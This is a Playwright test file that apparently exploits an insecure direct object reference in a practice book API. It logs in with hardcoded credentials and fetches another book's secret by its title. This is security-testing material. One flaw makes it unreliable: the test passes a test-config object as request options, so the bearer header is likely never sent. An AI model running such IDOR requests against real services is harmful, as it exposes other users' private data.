import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';

test('Exploiting the IDOR vulenrability', async ({ request }) => {
    const login = await request.post(`/users/v1/login`, {
      data: {
        username: 'thieuhoa',
        password: 'test1'
      },
    });
  
    expect(login.ok()).toBeTruthy();
    const token = await login.json()
    let accessToken = token.auth_token
    const config: PlaywrightTestConfig = {
      use: {
        baseURL: `${process.env.API_URL}`,
        extraHTTPHeaders: {
          Authorization: `Bearer ${accessToken}`,
        },
      },
    };

    await test.step("Retrieves all books", async () => {
      const getAllBook = await request.get(`/books/v1`);
      expect(getAllBook.status()).toBe(200);
    });
    await test.step("Retrieves book by title along with secret", async () => {
      const getBook = await request.get(`/books/v1/bookTitle97`, config);
      expect(getBook.status()).toBe(200);
    });
});








